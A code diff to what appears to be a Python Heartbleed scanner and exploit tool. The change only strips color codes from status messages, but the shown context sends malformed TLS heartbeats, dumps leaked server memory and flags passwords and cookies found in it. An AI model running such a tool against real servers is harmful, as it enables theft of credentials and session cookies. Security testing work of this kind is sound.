@@ -119,7 +119,7 @@ def hexdump(s):
 
     # Open output file (if specified by user)
     if len(file) > 0:
-        status.set(colors.OKGREEN + 'DONE: ' + colors.END + 'memory dump was saved in output file.\n')
+        status.set('DONE: memory dump was saved in output file.')
         output = open(file, 'a')
 
     # Variables for detecting passwords and cookies in memory dump
@@ -202,7 +202,7 @@ def hit_hb(s, file, key):
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            status.set(colors.FAIL + 'ERROR: ' + colors.END + 'no heartbeat response received, server likely not vulnerable')
+            status.set('ERROR: no heartbeat response received, server likely not vulnerable')
             return False
 
         if typ == 24:
@@ -222,24 +222,24 @@ def hit_hb(s, file, key):
                 if len(query) > 0:
                     logList(query, 'QUERY (key)', colors.HEADER, '\n')
                 else:
-                    status.set(colors.HEADER + 'QUERY (key): ' + colors.END + 'no results\n')
+                    status.set('QUERY (key): no results')
 
             if hasCookie:
-                status.set(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output')
+                status.set('COOKIE: server returned cookies - check output')
             if hasPwd:
-                status.set(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output')
+                status.set('PASSWORD: server returned passwords - check output')
 
             if len(pay) > 3:
-                status.set(colors.WARNING + 'WARNING: ' + colors.END + 'server returned more data than it should - server is vulnerable!')
+                status.set('WARNING: server returned more data than it should - server is vulnerable!')
             else:
-                status.set(colors.FAIL + 'ERROR: ' + colors.END + 'server processed malformed heartbeat, but did not return any extra data.')
+                status.set('ERROR: server processed malformed heartbeat, but did not return any extra data.')
 
             return True
 
         if typ == 21:
             status.set('Received alert:')
             hexdump(pay, file, key)
-            status.set(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable')
+            status.set('ERROR: server returned error, likely not vulnerable')
             return False
 
 def execute():
